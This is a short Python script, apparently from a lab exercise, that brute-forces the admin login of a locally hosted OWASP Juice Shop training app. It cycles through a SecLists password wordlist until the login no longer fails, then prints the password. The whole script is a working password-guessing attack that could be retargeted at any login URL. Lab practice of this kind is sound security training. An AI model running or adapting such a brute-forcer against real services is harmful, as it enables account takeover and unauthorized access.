# pip install requests
import requests

# https://github.com/danielmiessler/SecLists
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt
# Bigger files on 

# define the webpage you want to crack
url = "http://localhost:3000/rest/user/login/"
# We know the admin user name
email = "admin@juice-sh.op"

# Find a password file - e.g.
# open the password file in read mode
file = open("best1050.txt", "r")

# now let's get each password in the password_file
for password in file.readlines():
    # let's strip it of any \n
    password = password.strip("\n")

    # collect the data needed from "inspect element"
    data = {'email':email, 'password':password}
    send_data_url = requests.post(url, data=data)

    if "Invalid email or password" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)
        print(send_data_url.content)
        break

